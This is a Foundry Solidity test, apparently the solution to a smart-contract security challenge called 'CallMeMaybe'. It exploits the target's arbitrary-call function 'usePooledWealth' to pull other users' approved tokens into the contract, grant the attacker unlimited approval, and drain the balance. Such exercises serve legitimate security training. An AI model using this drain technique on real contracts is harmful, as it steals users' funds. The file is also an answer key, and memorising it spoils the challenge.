// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test, console } from "forge-std/Test.sol";
import { CallMeMaybe } from "../src/2_CallMeMaybe.sol";
import { CallMeMaybeHelper } from "../test_helper/2_CallMeMaybeSetup.sol";
import "../mocks/marqToken.sol";

contract CallMeMaybeTest is Test {
    CallMeMaybe public target;
    MarqToken public token;
    address[] public users = [address(0x01), address(0x02), address(0x03)];


    function setUp() public {
        CallMeMaybeHelper dontpeak = new CallMeMaybeHelper();
        target = dontpeak.deployed();
        token = dontpeak.token();
    }


    function test_GetThisPassing_2() public {
        address hacker = address(0xBAD);
        address targetAddr = address(target);

        uint256 startBalance = token.balanceOf(hacker);
        
        vm.startPrank(hacker);

        target.joinGroup(0);
        for (uint256 i; i < users.length; i++) {
            bytes memory params = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                users[i],
                targetAddr,
                token.balanceOf(users[i])
            );
            target.usePooledWealth(params, address(token));
        }

        bytes memory params = abi.encodeWithSignature(
            "approve(address,uint256)",
            hacker,
            type(uint256).max
        );
        target.usePooledWealth(params, address(token));
        token.transferFrom(targetAddr, hacker, token.balanceOf(targetAddr));

        vm.stopPrank();
        
        assertGt(token.balanceOf(hacker), 301 ether);
    }

}
